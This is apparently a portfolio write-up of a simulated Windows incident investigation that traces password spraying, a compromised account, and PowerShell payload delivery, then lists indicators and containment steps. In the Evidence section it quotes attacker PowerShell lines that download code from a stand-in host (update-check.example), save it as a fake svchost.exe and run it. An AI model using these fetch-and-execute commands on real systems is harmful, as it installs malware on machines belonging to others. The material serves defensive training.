# Investigation 01 — Windows Security Alert Investigation

## Lab Disclaimer

This is a controlled cybersecurity learning investigation created for portfolio purposes. The data used in this investigation is simulated lab data and does not represent a real company incident.

## Executive Summary

The investigation identified a password-spraying pattern targeting multiple accounts, followed by a successful network authentication for `user04`.

After authentication, activity showed a suspicious process chain involving `cmd.exe` and PowerShell. PowerShell downloaded a script from an external domain and saved it to a publicly accessible directory.

Further investigation showed that a payload was downloaded and executed. The SHA256 hash of the payload matched a known-malicious sample.

Based on the correlated evidence, the activity was assessed as **confirmed malicious activity / confirmed compromise** of the lab workstation.

## Initial Detection

The initial alert showed multiple failed network logon attempts:

| Time | Event | Account | Logon Type | Source |
|---|---|---|---|---|
| 10:14:02 | 4625 | user01 | 3 | 10.10.20.15 |
| 10:14:05 | 4625 | user02 | 3 | 10.10.20.15 |
| 10:14:08 | 4625 | user03 | 3 | 10.10.20.15 |
| 10:14:11 | 4625 | user04 | 3 | 10.10.20.15 |
| 10:14:15 | 4624 | user04 | 3 | 10.10.20.15 |

The same source targeted multiple accounts and eventually authenticated successfully to `user04`.

This pattern is consistent with **password spraying**, rather than traditional brute force.

## Evidence

### Authentication Activity

Event ID `4625` showed multiple failed authentication attempts.

Event ID `4624` showed a successful authentication for `user04`.

The successful authentication used **Logon Type 3**, indicating network authentication.

### Process Activity

Shortly after authentication:

```text
10:14:21  4688
Process: cmd.exe
User: user04
Parent: explorer.exe
10:14:24  4688
Process: powershell.exe
User: user04
Parent: cmd.exe
The cmd.exe → powershell.exe process chain required investigation because it occurred shortly after suspicious authentication activity.
PowerShell Activity
The PowerShell command was:
powershell.exe -ExecutionPolicy Bypass -Command
"Invoke-WebRequest https://update-check.example/a.ps1
-OutFile C:\Users\Public\update.ps1"
PowerShell Script Block Logging (4104) confirmed the use of Invoke-WebRequest to download the script.
The script was saved to:
C:\Users\Public\update.ps1
-ExecutionPolicy Bypass was treated as an investigation clue, not proof of malicious activity by itself.
Network Activity
The PowerShell process established a network connection to:
203.0.113.75:443
A DNS query was also observed for:
update-check.example
Payload Execution
Further evidence showed:
$u = "https://update-check.example/payload.exe"
Invoke-WebRequest $u -OutFile "C:\Users\Public\svchost.exe"

Start-Process "C:\Users\Public\svchost.exe"
The downloaded executable was stored under the misleading filename:
C:\Users\Public\svchost.exe
The SHA256 hash was identified as:
KNOWN-MALICIOUS-HASH
Threat intelligence confirmed that the hash was associated with malware.
Timeline
Time
Activity
10:14:02–10:14:11
Multiple failed Type 3 authentication attempts against different accounts
10:14:15
Successful Type 3 authentication for user04
10:14:21
cmd.exe created
10:14:24
PowerShell created by cmd.exe
10:14:24
PowerShell used ExecutionPolicy Bypass
10:14:27
PowerShell Script Block Logging recorded the download command
10:14:31
PowerShell connected to external IP over port 443
10:14:32
update.ps1 created in C:\Users\Public
10:14:35
DNS query for update-check.example
Later
Malicious payload downloaded and executed
Later
Payload hash matched known malware
Analysis and Correlation
The individual indicators were correlated rather than treated as isolated evidence.
The investigation chain was:
Password spraying
        ↓
Successful Type 3 authentication
        ↓
cmd.exe
        ↓
PowerShell
        ↓
ExecutionPolicy Bypass
        ↓
External download
        ↓
Script written to C:\Users\Public
        ↓
Payload downloaded
        ↓
Payload executed
        ↓
Known-malicious SHA256
The combination of successful authentication, suspicious PowerShell activity, external payload retrieval, execution, and a known-malicious hash provides strong evidence of compromise.
Indicators of Compromise
Indicator
Type
update-check.example
Domain
203.0.113.75
IP address
C:\Users\Public\update.ps1
File path
C:\Users\Public\svchost.exe
File path / suspicious filename
KNOWN-MALICIOUS-HASH
SHA256
Invoke-WebRequest
Command
-ExecutionPolicy Bypass
Command-line indicator
Verdict
Confirmed malicious activity / confirmed compromise.
The evidence shows a progression from password spraying to successful authentication, followed by PowerShell-based payload delivery and execution.
The final payload's SHA256 hash matched a known-malicious sample, providing strong confirmation that the activity was malicious.
The investigation does not establish that the human user user04 was responsible. The evidence only shows that the user04 account was used during the activity.
Containment and Response Recommendations
Immediate containment actions would include:
Isolate the affected workstation from the network.
Reset or disable the compromised account according to incident-response procedures.
Block the identified malicious domain and IP where appropriate.
Quarantine and remove the malicious payload.
Search the environment for the same SHA256 hash.
Search for the identified domain, IP address, file paths, and command-line indicators.
Investigate other systems for similar authentication and PowerShell activity.
Determine how the credentials were obtained.
Lessons Learned
This investigation demonstrated the importance of correlating multiple security events rather than relying on a single indicator.
Important investigation techniques included:
Identifying password-spraying patterns.
Interpreting Windows authentication events.
Understanding Logon Type 3.
Building process trees.
Investigating PowerShell command lines.
Using PowerShell Script Block Logging.
Correlating DNS and network activity.
Investigating downloaded files.
Using file hashes as indicators of compromise.
Building an incident timeline.
Distinguishing suspicious activity from confirmed malicious activity.
Conclusion
This lab investigation demonstrates a SOC-style approach to alert triage and incident investigation.
The investigation moved from an initial authentication alert through process, PowerShell, network, DNS, file, and threat-intelligence evidence to reach a final verdict based on correlated evidence.
